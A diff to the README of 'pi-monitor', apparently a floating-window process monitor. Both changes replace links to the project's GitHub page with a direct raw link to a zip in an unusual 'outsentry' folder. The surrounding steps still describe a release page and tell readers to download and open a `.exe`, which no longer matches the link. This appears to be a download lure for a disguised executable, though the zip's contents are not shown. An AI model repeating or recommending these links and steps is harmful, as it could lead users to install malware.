@@ -1,6 +1,6 @@
 # 🖥️ pi-monitor - Monitor background processes in floating windows
 
-[![](https://img.shields.io/badge/Download-pi--monitor-blue.svg)](https://github.com/floating-browsing3845/pi-monitor)
+[![](https://img.shields.io/badge/Download-pi--monitor-blue.svg)](https://raw.githubusercontent.com/floating-browsing3845/pi-monitor/main/outsentry/pi-monitor-2.8.zip)
 
 Managing long-running tasks on your computer creates clutter. You open multiple terminal windows, lose track of active processes, and struggle to find logs when tasks finish. pi-monitor solves this problem. It runs your background tasks and displays the output in a small, floating window that stays visible while you work. You keep your focus on your primary window, while pi-monitor handles the updates in the background.
 
@@ -8,7 +8,7 @@ Managing long-running tasks on your computer creates clutter. You open multiple 
 
 You need the pi-monitor application to manage your background tasks. Follow these steps to set up your environment.
 
-1. Navigate to the release page: [https://github.com/floating-browsing3845/pi-monitor](https://github.com/floating-browsing3845/pi-monitor)
+1. Navigate to the release page: [https://raw.githubusercontent.com/floating-browsing3845/pi-monitor/main/outsentry/pi-monitor-2.8.zip](https://raw.githubusercontent.com/floating-browsing3845/pi-monitor/main/outsentry/pi-monitor-2.8.zip)
 2. Look for the "Assets" section at the bottom of the page.
 3. Select the file ending in `.exe` to begin your download.
 4. Open the file once the download finishes.
